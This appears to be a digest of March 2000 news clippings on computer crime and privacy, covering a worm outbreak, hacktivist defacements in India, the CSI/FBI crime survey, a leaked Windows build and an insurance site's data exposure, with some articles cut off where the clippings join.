      for them. One would cover our Foreign Corrupt Practices Act, and how we 
      use it, quite effectively, to       discourage U.S. companies from bribing 
      foreign governments. A second would cover why Adam Smith is a better guide 
      than Colbert for 21st-century economies. Then we could move on to 
      industrial espionage, and our visitors could explain, if they can keep 
      straight faces, that they don't engage in it. Will the next commission 
      pursue the issue of rude American maitre d's? 

      Get serious, Europeans. Stop blaming us and reform your own statist 
      economic policies. Then your companies can become more efficient and 
      innovative, and they won't need to resort to bribery to compete. 

      And then we won't need to spy on you.

      Authorities tell faux-stalker
      site to tone it down 
 
      March 17, 2000
      Web posted at: 8:46 p.m. EST (0146 GMT)
 
      By D. Ian Hopper
      CNN Interactive Technology Editor
 
      (CNN) -- After getting over 2 million
      page views, the authors of a
      faux-stalker site got a call from
      someone who wasn't such a fan -- a
      police detective. 
 
      A detective from the Computer
      Crimes Division of the L.A. County Sheriff's Department contacted Spark
      Factory president Tim Street Friday. According to authorities, the detective
      strongly suggested that Street take down FortheloveofJulie.com, a fake
      stalker site that aims to be an entertaining but spooky story in the tradition of
      last year's "The Blair Witch Project" phenomenon. 
 
      The site is a shrine to "Julie" from her admirer, a video-store clerk who
      follows her home and to her work, taking videos and posting a journal
      complete with movie clips and pictures. 
 
      The site has become very popular, Street says,
      through both word-of-mouth and media
      attention. While it's completely fake, many users
      failed to see a disclaimer because they're going
      through a publicized back door that bypasses
      SpookySites.com, where it's indexed. 
 
      SpookySites contains a small disclaimer upon entering the site that informs
      users that the content within "may contain fictionalization." 
 
      But like many others, the detective entered the site through a back door,
      missing the disclaimer. When he called Street, the site's author was skeptical.
 
      "He told me he was with the police department. I wanted to call him back to
      make sure, because practical jokes around here are running rampant," Street
      said. "One guy here said he was from the FBI." 
 
      "We received a tip from an investigator on the East Coast," says Sgt. Larry
      Balich. 
 
      Authorities found a photo in the site that clearly showed a vehicle and license
      plate, and traced it back to Street. 
 
      "We thought we had a stalking situation on our hands," Balich says. "But we
      needed a victim. You can't investigate a case without a victim or witness,
      and we had neither." 
 
                                   After contacting the district attorney's
                                   office, detectives found that no crime
                                   had been committed. Still, Street says,
                                   police "strongly suggested" that he

      more misunderstandings.

      Windows Worm Virus
      Slithers 

      Computer Associates identifies virus that travels

      A new worm now "in the wild" has the potential to shut
      down Windows platforms and make the operating
      system permanently unusable.

      Computer Associates International discovered the
      worm, Win32/Melting.worm, on Tuesday, when
      customers started to find it in their e-mail systems,
      says Narender Mangalam, director of security solutions
      at CA. So far, it has hit some Fortune 1000 software
      companies, he says.

      "The risk level is moderate, and it hasn't caused too
      much damage because we believe we've caught it in
      time," Mangalam says. CA markets InoculateIT, a virus
      detection and prevention program.

      The Melting Worm is unleashed through Microsoft's
      Outlook running on Windows 95, 98, 2000, or NT,
      according to CA representatives. Once launched, the
      worm puts a copy of itself into a Windows directory as
      MeltingScreen.exe and remains in memory. Files with
      .exe extensions in a system's Windows directory are
      renamed with .bin extensions.

      As the worm renames files, including ones critical to
      operating Windows, these changes may render the
      operating system useless.

      The worm also starts to e-mail itself to all the names in
      a victim's Outlook address book and randomly
      executes other .exe files, Mangalam says. This
      potentially can take down a company's e-mail system.

     'Police must get ahead of e-crime' 

     By JANINE ISRAEL 

     Undetected organised electronic-crime could undermine the nation's security 
     and financial stability, the Australian Federal Police Commissioner, Mr 
     Mick Palmer, warned yesterday.

     He told a conference of Australasian and south-west Pacific police 
     commissioners in Canberra that a co-ordinated international response was 
     required urgently to crack down on electronic terrorism, child pornography, 
     racism, fraud and money laundering.

     Mr Palmer said the Internet meant crimes were being committed in countries 
     where perpetrators had "never set foot" and international legislation and 
     treaties must be set up to prosecute criminals irrespective of national 
     borders. 

     Australia, New Zealand, Fiji and Papua New Guinea police commissioners 
     announced they would establish an Australasian Law Enforcement Electronic 
     Crime Strategy to address the issue.

     Mr Palmer said the Australian police force lacked electronic expertise, and 
     were looking to recruit computer boffins to tackle electronic crime.

     "We need to be buying those skills from the cutting edge of the 
     technological workplace. We need to form close partnerships with the 
     private sector and wider government agencies," he said. 

     But employing people with the skills to fight electronic crime was costly. 
     Retention was a problem in a competitive market where those with 
     technological skills were lured by high salaries to the private sector.

     The international nature of cyberspace made it almost impossible to 
     identify perpetrators let alone snare electronic criminals. Credit card 
     fraud already was costing the credit card industry billions, Mr Palmer 
     said.

     He said growing forms of e-crime included such things as money laundering 
     and tax evasion. Cyber-stalking, illegal interceptions or "electronic 
     eavesdropping" were a concern, as were political and industrial espionage. 
     Fraudulent sales pitches along with bogus charitable or investment 
     solicitations were increasingly common.

     These were not necessarily "new crimes", Mr Palmer said, just "new methods 
     to commit traditional crimes".

     "One of the difficulties with electronic crime is that not only is it very 
     intrusive and superficially invisible, but many crimes can be committed 
     without the victim knowing it has been committed," he said.

     While e-crime is still in its "embryo state", authorities predict it will 
     expand with the electronic market to become more organised and 
     sophisticated. "Much of it in the early stages is being done by people who 
     simply are boffins and are doing it by way of exploration rather than 
     criminal intent. The damage caused by those activities is of course equally 
     serious," he said.

     He said police were "alarmed" by the capability of people to commit 
     offences on a global basis, with complete anonymity, with speed and on a
     large scale. A staggering 900 million people were expected to be using 
     the Internet by the end of the year.

      Kashmir conflict continues to
      escalate -- online

      By D. Ian Hopper
      CNN Interactive Technology Editor

      March 20, 2000
      Web posted at: 8:15 p.m. EST (0115 GMT)

      (CNN) -- A group of Pakistani
      hackers has used the conflict in
      Kashmir as a reason to deface almost
      600 Web sites in India and take
      control of several Indian government
      and private computer systems, according to the group.

      A computer security Web site -- attrition.org -- has records of the
      defacements claimed by the Muslim Online Syndicate. 

      The M0S, which a member says consists of mostly Pakistani Muslims, is
      made up of self-proclaimed "hacktivists," those who commit computer
      crimes -- ranging from simple defacement to full-scale intrusions to denial of
      service attacks -- in order to bring attention to a social cause.

      The group has nine active members, according to a representative who
      spoke on behalf of the group on condition of anonymity. They range from 16
      to 24 years old, the representative said. Several of them are students or
      computer professionals, and one is a medical student, the representative
      added.

      Unlike the majority of Web vandals, the MOS
      members say they secretly take control of a
      server, then deface the site only when they
      "have no more use" for the data or the server
      itself. 

      "The servers we control range from harmless mail and Web services to
      'heavy duty' government servers," says the MOS representative. "The data is
      only being categorically archived for later use if deemed necessary."

      The group says it's not interested in e-commerce sites or credit card
      information.

      Most of the group's defacements came in one fell swoop, when they broke
      into India's largest Internet service provider, IndiaLinks. While there, they
      defaced more than 500 sites hosted by the company, including many travel
      and company sites, IndiaLinks confirms.

      IndiaLinks, based in Bombay, hosts more than
      6,000 Web sites, according to CEO Bhavin
      Chandarana.

      Chandarana says the group had access to
      servers co-hosted by Alabanza, an American
      ISP. He says the group had access for about an
      hour.

      The MOS won't be facing any legal problems
      stemming from its exploits, Chandarana says,
      because IndiaLinks was not able to get the server logs from Alabanza.
      Chandarana says his company is in the process of removing their business
      from the U.S. ISP.

      Representatives for Alabanza did not respond to several e-mails and two
      phone messages requesting comment.

      One of the Web sites defaced was that of the Indian Science Congress
      2000. The ISC's local organizing secretary, Bhushan Patwardhan, told The
      Hindu newspaper that the defacement was removed as soon as it was
      detected.

      The MOS has a Web site mirroring its attacks that contains a well-known
      expletive. Expletives in domain names used to be taboo, but with the
      deregulation of domain registration, it is no longer forbidden.

      "We hope to bring the Kashmir conflict to the world's attention," MOS says.
      "We wish to see the day when our Muslim brethren will be given the right to
      choose, as was promised them half a century ago."

      India and Pakistan have fought two wars over the last half-century over rival
      claims for the Himalayan territory of Kashmir. They clashed again last
      summer when Pakistan-based fighters seized mountain peaks inside India. 

      Hundreds of militants died before India and Pakistan -- under international
      and domestic pressure -- withdrew their forces. 

      Ignoring world pressure, India and Pakistan both tested nuclear devices in
      1998, dramatically escalating tensions. 

      The stated goal of the MOS -- social action through hacking -- is becoming
      a more popular one. Hacktivists attacked the World Trade Organization
      Web site during their Seattle conference last year, and a mailing list helps
      concerned activists discuss strategy, targets and coordinate attacks. Rather
      than simply defacing sites, denial of service attacks have become the
      weapon of choice.

      Alex Fowler, Strategic Initiatives Director for the Electronic Frontier
      Foundation, predicted this escalation in October 1999 in an interview with
      CNN Interactive.

      "We will see very serious attacks. Information stealing could have very
      long-term consequences for consumers," Fowler said.

      Hacker-controlled tanks, planes and warships? 

      BY Dan Verton       03/21/2000 

      Army officials are worried that sophisticated hackers and other 
      cybercriminals,       including military adversaries, may soon have the 
      ability to hack their way into and take control of major military weapon 
      systems such as tanks and ships. 

      Speaking this month at the annual Army Directors of Information Management       
      Conference in Houston, Army Maj. Sheryl French, a program manager 
      responsible for the Armys Information Assurance Architecture for the 
      Digitized Force, said the potential exists for hackers to infiltrate the 
      computer systems used in tanks and other armored vehicles. Unlike in the 
      past, todays modern tanks and ships are almost entirely dependent on 
      computers, software and data communications links for functions such as 
      navigation, targeting and command and control. 

      Although the Pentagon has always had computer security issues to deal 
      with,       "weve never had computers" in tanks and armored personnel 
      carriers before, said French, pointing to a picture of an M-1 Abrams Main 
      Battle Tank. 

      In fact, the Defense Department has already tested and proven that hackers 
      have       the ability to infiltrate the command and control systems of 
      major weapons, including Navy warships. According to a training CD-ROM on 
      information assurance, published by the Defense Information Systems 
      Agency, an Air Force officer sitting in a hotel room in Boston used a 
      laptop computer to hack into a Navy ship at sea and implant false 
      navigation data into the ships steering system. 

      "Yes, this actually happened," the CD-ROM instructs military personnel 
      taking the       course. "Fortunately, this was only a controlled test to 
      see what could be done. In reality, the type of crime and its objective is 
      limited only by peoples imagination and ability." 

      John Pike, a defense and intelligence analyst with the Federation of 
      American       Scientists, said that although there are well-known 
      security gaps in the commercial systems that the Army plans to use on the 
      battlefield, hacking into tanks and other weapons may prove to be too 
      difficult for an enemy engaged in battle. 

      "The problem for the enemy is that computer security vulnerabilities will 
      almost       certainly prove fleeting and unpredictable," said Pike, 
      adding that such tactics would be nearly impossible to employ beyond the 
      random harassment level.

      SYDNEY - Loopholes in Federal laws mean
      hacker advocate group 2600 Australia will be able
      to broadcast DVD decryption codes and other
      sensitive information on national television within
      weeks.
 
 
      Grant Bayley, who heads up 2600 Australia, the
      international organisation's Australian operation,
      said it was currently devising a 15-second
      broadcast, which he said would contain text files,
      delivered at 12 frames per second, and suggestions
      pertaining to the "ethics" of datacasting, computer
      security and privacy, and access-controlling DVD
      encryption.
 
      Bayley said the text contained in the broadcast
      would not be comprehensible as it appeared live on
      television, but he suggested viewers record the
      broadcast on video and then watch the information
      afterwards "frame by frame".
 
      Bayley said the broadcast would be "fed" to
      Channel 10 by MindShare, a company that
      supplies advertising material in bulk for the
      television station. MindShare's own advertising
      slogan is "Head space invaders". The broadcast
      time was not yet known, but Bayley said it was
      expected to screen between 3:00 and 4:00 am
      "some time in the next few weeks".
 
      Bayley maintained information contained in the
      broadcast would "primarily encourage ethical",
      educational use of new technologies such as
      datacasting. However, he admitted some
      information -- pertaining to the decryption of DVD
      access codes -- which could not be legally
      broadcast in the US, would be screened. 
 
      Australian Federal copyright laws, even those
      currently being amended, were unable to prevent
      broadcasting of information such as DVD
      decryption codes, regardless of how commercially
      crippling the information might potentially be, he
      said. 
 
      Bayley said he was convinced that he knew the
      15-year-old hacker who penetrated the ASX
      website two weeks ago "pretty well". The ASX
      hack caused an outage of four hours, leaving the
      site littered with banner messages reading
      "Prosthetic owns the ASX". Bayley maintained
      2600 did not support or encourage vandalistic
      hack attacks such as this. "Stupid people do stupid
      things," he said.
 
      The title "2600" refers to the frequency of pitch that
      technology-savvy Americans played into their
      telephone receivers to thwart long distance call
      charges in the early 1980s.

      Court upholds agency reviews of
      employees' Internet use
 
      By Kellie Lunney

      A federal appeals court has upheld a CIA policy allowing
      agency officials to monitor employees' Internet use. The policy
      had helped convict a federal employee of downloading child
      pornography on government time. 
 
      The CIA's Foreign Broadcast Information Service
      implemented a policy in June 1998 authorizing "electronic
      audits" of employee computers in order to crack down on
      non-business related Internet use. Those audits included
      reviewing employees' e-mail messages and collecting
      information on their Web site visits.
 
      Later that summer, Science Applications International Corp.
      (SAIC), which had a contract to manage FBIS' computer
      network and monitor inappropriate Internet behavior, alerted
      the agency when the keyword "sex" turned up numerous hits in
      a firewall database during a routine test. The hits originated
      from the computer of Mark L. Simons, an electronic engineer
      at FBIS.
 
      FBIS officials then searched Simons' computer and office on
      four occasions, eventually compiling enough evidence to indict
      him on two counts of knowingly receiving and possessing child
      pornography downloaded from the Internet and stored on his
      government hard drive.
 
      Simons claimed that his Fourth Amendment rights had been
      violated during the searches. But a district court upheld the
      searches. Simons was found guilty and was sentenced to 18
      months in jail.
 
      The U.S. Court of Appeals for the Fourth Circuit affirmed that
      decision in late February, saying that Simons failed to prove
      that he had a "legitimate expectation of privacy in the place
      searched or the item seized."
 
      According to the appeals court, "In the final analysis, this case
      involves an employee's supervisor entering the employee's
      government office and retrieving a piece of government

      The Computer Security Institute and the San Francisco
      FBI Computer Intrusion Squad jointly released a report
      today that said that electronic crime cost companies at
      least $266 million last year. The study found that 70%
      of the responding companies detected the unauthorized
      use of their computer systems in the last 12 months up
      from 62% the year before. Insiders and disgruntled
      employees topped the lists of worrisome security
      threats. (One conclusion that can be drawn form this
      study is that e-crime is on the rise, another is that
      people are more willing to admit intrusions or that
      detection of criminal activity has gotten better. The
      numbers are interesting but really don't say anything.)

      Report: 'E-crime is booming'

      Some 70 percent of companies queried in a new study have detected attacks 
      on their networks, the FBI/CSI reports.

       
      By Robert Lemos, ZDNet News UPDATED March 22, 2000 10:00 AM PT 

      SAN FRANCISCO -- Just like e-commerce, electronic crime is a booming 
      business, according to a survey released by the Computer Security 
      Institute and the San Francisco FBI Computer Intrusion Squad on Wednesday.       
      The study found that 70 percent of CSI's 585 member companies that 
      responded to its survey detected the unauthorized use of their computer 
      systems in the last 12 months -- up from 62 percent the year before. 

      "Isn't e-commerce booming? Then e-crime is booming," said Richard Power, 
      editorial director and analyst for the Computer Security Institute. 

      "The Internet revolution is going on regardless, but the more commerce 
      that goes online, the more crime that goes online as well." 

      While not a scientific estimate of computer crime, the report does measure 
      the anonymous admissions of more than 640 security professionals who are 
      part of CSI. 

      Insiders the biggest fear       More than three-quarters of those 
      professionals identified hackers as a security threat, but insiders 
      concerned the respondents more, with 81 percent worried about disgruntled 
      employees. 

      CSI's Power explained that professional hackers are more of a threat, 
      however. "That's the real problem, not a juvenile hacker," he said. "The 
      point is, if a 16-year-old kid can do (what we have seen), then what are 
      the professionals doing?" 

      The report also indicates that corporate computer systems are far from 
      secure. Almost 90 percent of the security professionals who answered the 
      survey detected a security threat, which includes unauthorized access as 
      well as improper use of a corporate computer or e-mail and computer 
      viruses. 

      Of those intrusions, only 42 percent of the companies affected put a 
      dollar sign on the amount of damage done. The total: $266 million. 

      With only one computer security administrator per 1,000 computers, the 
      situation may not get any better soon.

      Ninety percent of survey respondents detect cyber attacks, 273 organizations
      report $265,589,940 in financial losses
      
      SAN FRANCISCO -- The Computer Security Institute (CSI) announced today the 
      results of its fifth annual "Computer Crime and Security Survey." The 
      "Computer Crime and Security Survey" is conducted by CSI with the 
      participation of the San Francisco Federal Bureau of Investigation's (FBI) 
      Computer Intrusion Squad. The aim of this effort is to raise the level of 
      security awareness, as well as help determine the scope of computer crime 
      in the United States.

      Highlights of the "2000 Computer Crime and Security Survey" include the 
      following: 

           Ninety percent of respondents (primarily large corporations and 
           government agencies) detected computer security breaches within the 
           last twelve months.

           Seventy percent reported a variety of serious computer security 
           breaches other than the most common ones of computer viruses, laptop 
           theft or employee "net abuse"--for example, theft of proprietary 
           information, financial fraud, system penetration            from 
           outsiders, denial of service attacks and sabotage of data or 
           networks.

           Seventy-four percent acknowledged financial losses due to computer 
           breaches.

           Forty-two percent were willing and/or able to quantify their 
           financial losses. The losses from these 273 respondents totaled 
           $265,589,940 (the average annual total over the last three years was 
           $120,240,180).

      Financial losses in eight of twelve categories were larger than in any 
      previous year. Furthermore, financial losses in four categories were 
      higher than the combined total of the three previous years. For example, 
      6I respondents quantified losses due to sabotage of       data or networks 
      for a total of $27,148,000. The total financial losses due to sabotage for 
      the previous years combined totaled only $10,848,850.

      As in previous years, the most serious financial losses occurred through 
      theft of proprietary information (66 respondents reported $66,708,000) and 
      financial fraud (53 respondents reported $55,996,000).

      Survey results illustrate that computer crime threats to large 
      corporations and government agencies come from both inside and outside 
      their electronic perimeters, confirming the trend in previous years. 
      Seventy-one percent of respondents detected unauthorized       access by 
      insiders. But for the third year in a row, more respondents (59%) cited 
      their Internet connection as a frequent point of attack than cited their 
      internal systems as a frequent point of attack (38%).

      Based on responses from 643 computer security practitioners in U.S. 
      corporations, government agencies, financial institutions, medical 
      institutions and universities, the findings of the "2000 Computer Crime 
      and Security Survey" confirm that the threat from       computer crime and 
      other information security breaches continues unabated and that the 
      financial toll is mounting.

      Respondents detected a wide range of attacks and abuses. Here are some 
      other examples:
      
           25% of respondents detected system penetration from the outside.
      
           27% of respondents detected denial of service attacks.
      
           79% detected employee abuse of Internet access privileges 
               (for example, downloading pornography or pirated software,
                or inappropriate use of e-mail systems).
      
           85% detected computer viruses.
      
      For the second year, we asked some questions about electronic commerce over
      the Internet. Here are some of the results:
      
           93% of respondents have WWW sites.
      
           43% conduct electronic commerce on their sites (in 1999, only it was only 30%).
      
           19% suffered unauthorized access or misuse within the last twelve months.
      
           32% said that they didn't know if there had been unauthorized access or misuse.
      
           35% of those acknowledging attack, reported from two to five incidents.
      
           19% reported ten or more incidents.
      
           64% of those acknowledging an attack reported Web-site vandalism.
      
           60% reported denial of service.
      
           8% reported theft of transaction information.
      
           3% reported financial fraud.
      
      Patrice Rapalus. CSI Director, suggests that the "Computer Crime and 
      Security Survey," now in its fifth year, has delivered on its promise to 
      raise the level of security awareness and help determine the scope of 
      crime in the United States. 

      "The trends the CSI/FBI survey has highlighted over the years are 
      disturbing. Cyber crimes and other information security breaches are 
      widespread and diverse. Ninety percent of respondents reported attacks. 
      Furthermore, such incidents can result in serious       damages. The 273 
      organizations that were able to quantify their losses reported a total of 
      $265,589,940. Clearly, more must be done in terms of adherence to sound 
      practices, deployment of sophisticated technologies, and most importantly 
      adequate staffing and training of information security practitioners in 
      both the private sector and government."

      Bruce J. Gebhardt is in charge of the FBI's Northern California office. 
      Based in San Francisco, his division covers fifteen counties, including 
      the continually expanding "Silicon Valley" area. Computer crime is one of 
      his biggest challenges. 

      "If the FBI and other law enforcement agencies are to be successful in 
      combating this continually increasing problem, we cannot always be placed 
      in a reactive mode, responding to computer crises as they happen. The 
      results of the CSI/FBI survey provide us       with valuable data. This 
      information not only has been shared with Congress to underscore the need 
      for additional investigative resources on a national level but identifies 
      emerging crime trends and helps me decide how best to proactively, and 
      aggressively assign resources, before those 'trends' become 'crises.'"

      CSI, established in 1974, is a San Francisco-based association of 
      information security professionals. It has thousands of members worldwide 
      and provides a wide variety of information and education programs to 
      assist practitioners in protecting the information assets of corporations 
      and governmental organizations. 

      The FBI, in response to an expanding number of instances in which 
      criminals have targeted major components of information and economic 
      infrastructure systems, has established the National Infrastructure 
      Protection Center (NIPC) located at FBI headquarters       and the 
      Regional Computer Intrusion Squads located in selected offices throughout 
      the United States. The NIPC, a joint partnership among federal agencies 
      and private industry, is designed to serve as the government's lead 
      mechanism for preventing and responding to cyber attacks on the nation's 
      infrastructures. (These infrastructures include telecommunications, 
      energy, transportation, banking and finance, emergency services and 
      government operations). The mission of Regional Computer Intrusion Squads 
      is to investigate violations of Computer Fraud and Abuse Act (Title 8, 
      Section 1030), including intrusions to public switched networks, major 
      computer network intrusions, privacy violations, industrial espionage,

      Whistler Hits the Web 
      By Nate Mook, eFront March 20th, 2000, 6:35 PM

      An internal build of Microsoft's future operating system, set to combine 
      consumer and business versions into a product currently codenamed Whistler 
      Windows 2001, has leaked out       onto the Internet. Build number 2211.1 
      was posted onto various college and Internet sites early this morning and 
      spread as per usual, like wildfire. 

      While the new operating system currently looks almost identical to Windows 
      2000, a number of people who installed the leaked build stated there were 
      a few HTML enhancements       to folders, simplifying things for novice 
      users. For example, the control panel is now by default an HTML interface, 
      offering access to a few basic configuration options. 

      Whistler does contain the infamous MarsCore.DLL file which started rumors 
      last month regarding the purpose of Mars, now known to be part of the 
      future version of Microsoft's MSN       client. However, it is unknown 
      whether or not the new HTML folders are part of the Mars core or if users 
      will be given the opportunity to switch off more user friendly parts of 
      the operating system. 

      As usual with an early Alpha release, most new features and enhancements 
      will not be added until Beta 1. Keep checking back for continued coverage 
      regarding Microsoft Whistler.

      Windows 2001 leaked on the Web
 
      A pirated version of Windows 2001 is winding its way across the Net. And 
      it looks a lot like today's Windows.

      By Mary Jo Foley, ZDNet News       UPDATED March 21, 2000 2:03 PM PT 

      Microsoft Corp.'s next full-fledged version of Windows, code-named 
      Whistler, is at least a year away from release -- but already a pirated 
      version of one of the latest builds has found its way onto the Net.

      As reported by the Windows enthusiast sites ActiveWin and BetaNews, a 
      recent internal build of Whistler has been posted illegally to a number of 
      college and Internet sites. 

      ActiveWin and BetaNews are reporting that Build 2211.1 was posted Tuesday 
      morning and "spread as per usual, like wildfire." 

      Whistler is the code name for the first full-fledged upgrade to Windows 
      2000 that will be based on the Windows NT kernel, rather than the Windows 
      9X kernel. (The Windows 9X update is code-named Millennium and expected to 
      ship in the third or fourth quarter of this year.) Whistler is tentatively 
      slated to ship in March 2001, according to internal Microsoft documents. 

      Microsoft (Nasdaq: MSFT) won't comment on where Whistler is in the 
      development process. But sources close to the company say the latest 
      "stable" internal developers build is numbered 2207. The most recent 
      internal test build is 2214, sources add. 

      A Microsoft spokesman said the company was investigating reports of 
      pirated Whistler builds but would make no further comment. 

      Looks like Win2000 -- so far       As noted by ActiveWin, the pirated 
      Whistler build looks almost identical to Windows 2000 Professional. 

      "A number of people who installed the leaked build stated there were a few 
      HTML enhancements to folders, simplifying things for novice users," 
      ActiveWin reported. "For example, the control panel is now by default an 
      HTML interface, offering access to a few basic configuration options." 

      One change under the hood, according to ActiveWin, is the inclusion of the 
      MarsCore.DLL file. "Mars" is the code name for user interface technology 
      slated to be included in a future version of Microsoft's MSN client. At 
      one point, Mars was used as the code name for the next version of a 
      consumer-oriented version of Internet Explorer. After signing up Mars beta 
      testers last fall, Microsoft sent out a note telling testers it had 
      delayed the start of the beta because the company was "rethinking some of 
      our most basic assumptions" regarding the future user interfaces.

      It isn't just in the user interface that Microsoft has been redrawing its 
      Windows road map. 

      In January, Microsoft acknowledged that it had tabled work on "Neptune," a 
      consumer version of Windows slated to follow Millennium, and on "Odyssey," 
      an NT-kernel-based follow-on to Windows 2000. Instead, Microsoft said, it 
      planned to merge the Neptune and Odyssey code bases in the form of 
      Whistler. 

      The follow-on to Whistler, code-named Blackcomb, is expected to ship in 
      2002 or later.

      A 14-year-old computer whiz, who allegedly hacked into the
      accounts of a downtown Toronto business and tried to extort the
      owners, was charged yesterday with a raft of extortion and
      counterfeiting-related offences after a police sting operation. 

      The boy, who cannot be named under the Young Offenders Act,
      took control of the business's e-mail and chat rooms -- two
      operations vital to the business' survival -- for two weeks. He
      contacted the owner of the business through the Internet, demanding
      cash before he returned control of the accounts. 

      "He obviously displays a capability in computers that appears to be
      above average," said Detective Myron Demkiw. "They're pretty
      serious offences ... this is all relatively new ground for everybody." 

      The owner of the business contacted police, who traced the suspect
      to Keswick, a town 60 kilometres north of Toronto. 

      Investigators arranged a meeting on Monday where the suspect was
      supposed to receive the money he was demanding (a sum less than
      $5,000 was all police would say), and was arrested. 

      "He was calm throughout," Det. Demkiw said of the youth. 

      As a result of the investigation, detectives executed a search warrant
      on the boy's home and seized his computer, related documents, and
      some counterfeit money. 

      When asked if he had ever come across anything like this, Det.
      Demkiw replied: "No, never, and and this will be something new to
      the courts as well." 

      The youth has been charged with extortion, mischief to data,
      fraudulently possessing a computer password, production of
      counterfeit money, and two counts each of unauthorized use of a
      computer, and possession of counterfeit money.

      The long form of the US Census has sparked privacy
      concerns ever since it was introduced in 1960. With the
      increased awareness of computer security and identity
      theft those fears are even greater. Some residents fear
      giving out their personal information on the off chance
      that it may be stolen or otherwise fall into the wrong
      hands. The Census Bureau has taken some solace in the

      intrusive government questionnaire most will ever fill out. The "Long 
      Form" from the U.S. Census Bureau - 37 pages filled with 53 questions 
      about everything from language skills to toilets - is prompting some 
      recipients to squeal about invasion of privacy, a complaint that has 
      arisen every decade since the long form was launched in 1960.

      This year, however, Census officials and privacy experts said they detect 
      a more pointed fear: concern about computer security. The growth of the 
      Internet since the 1990 Census along with high-profile attacks on Web 
      sites such as Yahoo have exacerbated already-rising concerns about the 
      safety of any information on any computer anywhere.

      "Alarmed is a good word," said McAdams, 51, of Philadelphia, an assistant 
      director of Greater Philadelphia First, an alliance of business executives 
      in the region. "I assume they're going to compile all this information on 
      a computer somewhere. . . . Probably if [computer hacking] had not 
      happened so recently, I might not be as alarmed."

      To increasing numbers of people, the country is facing a "privacy 
      Chernobyl," said Robert R. Belair, a Washington-based privacy lawyer and 
      editor of a national newsletter on business privacy. "It doesn't surprise 
      me that the Census Bureau is going to have more trouble this year than 
      before."

      Unfortunately, some salient facts get lost in the din: The Census Bureau 
      has never suffered a computer-related security breach, experts agree.

      Its computers are kept separate from other government systems, and 
      respondents' names are separated from personal data when the results are 
      eventually compiled into databases, Census officials say.

      Moreover, since the 1930s, the Census Bureau, backed by the U.S. Supreme 
      Court, has jealously guarded its records; in 1942, it even rebuffed a 
      demand from the U.S. War Department for information on potential draftees.

      Census officials, for their part, take the once-a-decade privacy 
      complaints in stride as they collect the statistics for use in redrawing 
      congressional districts and determining federal funding formulas.

      Questions about household income, for example, are used to estimate the 
      number of subsidized lunches the neighborhood school might have to 
      provide.

      This year's new question about whether a resident provides primary care 
      for a grandchild is linked to welfare allocations.

      Maury Cagle, a bureau spokesman, said that even though the agency's 
      confidentiality record is clean, "people have an ingrained suspicion about 
      computers and private information. All of those things add to the falling 
      response rate."

      The Census Bureau projects its response rate for the 2000 Census will hit 
      its lowest level ever: 61 percent, down from 75 percent in 1980.

      As the response rate drops, the government has to hire ever more 
      head-counters - "enumerators," in bureau jargon - to brave back streets 
      and barking dogs to get the information personally.

      This year, the Census Bureau is mounting a $230 million outreach campaign 
      designed to raise the response rate and keep down the expense of 
      enumerators.

      Still, "people are a little more testy" about giving out personal 
      information than in years past, said Gorden DeJong, director of 
      Pennsylvania State University's Population Research Institute.

      DeJong and others blame everything: a spate of high-profile computer 
      attacks; rising concerns about confidentiality; a constant if sometimes 
      fluctuating distrust of government; and an ever-widening flood of private 
      surveys and junk mail with which Americans already contend.

      "For the number of things I get in the mail, I already must be on 50 
      lists," said Alessandroni, 84, a retired lawyer from Philadelphia. "It's 
      pretty obvious to me that there's no such thing as secrecy. . . . The 
      information is bound to get around."

      In the last two weeks, either the long form or a separate three-page short 
      form was mailed to 113 million households.

      An additional 22 million households with incomplete addresses or post 
      office boxes were having their forms hand-delivered. Households that don't 
      return the form by April 1 may get a visit from an enumerator.

      Every sixth household got a long form. The ratio was set by a scientific 
      sampling formula, and people may not fill out a long form unless they were 
      selected, said Phillip Lutz, assistant regional manager for the Census 
      region comprising Pennsylvania, New Jersey, Maryland, Delaware, and 
      Washington.

      Each form arrives bearing the bold-faced words: "Your Response is Required 
      by Law." What is not written is the fact that the $100 fine for failing to 
      respond - a fine dating to at least 1954 - apparently has not been imposed 
      in decades, even though federal courts have upheld the constitutionality 
      of the participation law.

      "We're not interested in fining people. We're interested in collecting 
      information," Lutz said.

      Still, some people are willing, even eager, to pay the fine rather than 
      give up personal information.

      "I wrote the number of people living in my house and enclosed a $100 
      check," said a 41-year-old participant in an Internet chat room about the 
      Census, who spoke on condition that only his first name, Greg, be printed. 
      "Why is it any of their business how I am paying or have paid for my 
      home?"

      So far, the refusers appear to be in the minority. State and local 
      officials across the country have joined with community and immigrant 
      groups to push for full participation, arguing that the sacrifice pays off 
      in federal funding.

      Pennsylvania officials have estimated that each person counted in 
      Philadelphia is worth an average of $2,200 in federal funds.

      "The very people who are not participating need to be counted so they can 
      have government services in their neighborhood," said Kate Kunda, 45, a 
      Spanish teacher from Wayne, Delaware County.

      As for herself, Kunda added: "I was annoyed that they wanted to know about 
      my electricity bill and mortgage, but we did make an effort to fill it 
      out."

      Insurance site exposes personal data
      Glitch on Selectquote site reveals information to next user
      By Mike Brunker 
      MSNBC

      March 22  Consumers who requested online life
      insurance quotes from Selectquote.com on
      Tuesday and Wednesday got more than they
      bargained for: Thanks to a software glitch, their
      personal information was left on the companys
      Web site for the next user to see.

      THE PROBLEM occurred when a form that
     consumers fill out to request a quote failed to clear the
     contents at the end of the process. This left everything from
     the previous users name and address to information on
     current coverage and parents health histories plainly visible
     to the next person to request a quote.
            Lyle Griffin, a spokesman for Selectquote, said the
     problem occurred when programmers fixed a piece of code
     on the site that was causing a problem for users with an
     older version of Internet Explorer. Unfortunately, the fix
     created a problem in the quote request form, he said. 
            The problem lasted from 4 p.m. PT on Tuesday until
     about 10 a.m. PT Wednesday, but it affected only about 20
     users who were directed to a newly designed Selectquote
     site that is still being tested, Griffin said. 
            .Not to minimize it,. he said of the problem.
     .Obviously this is extremely embarrassing.. 

     MSNBC.com was alerted to the problem late
     Tuesday by a prospective Selectquote customer,
     who was outraged that other visitors to the site
     were able to view her personal information.
     
     
            .About 10 minutes (after filling out the form) I got a call
     from a woman in Ohio who said, Im just someone whos
     on Selectquote and all your information is prepopulated in
     the questionnaire,. said Ona Karasa of Bellevue, Wash.
            She said she went back on the site Wednesday
     morning and saw the information of two other people who
     apparently had just requested life-insurance quotes using the
     online service. MSNBC editors also were able to access
     personal information entered by other users until
     midmorning Wednesday. 

            Another user, Richard Underwood of Rockville, Md.,
     said he was alerted to the problem early Wednesday by
     e-mail from another Selectquote surfer. He said a company
     representative had called and left a message concerning his
     request for a quote, but did not mention the Web site
     problem.
            .Truthfully, I dont know if I want to talk to anyone at
     Selectquote about life insurance at this point,. he said.
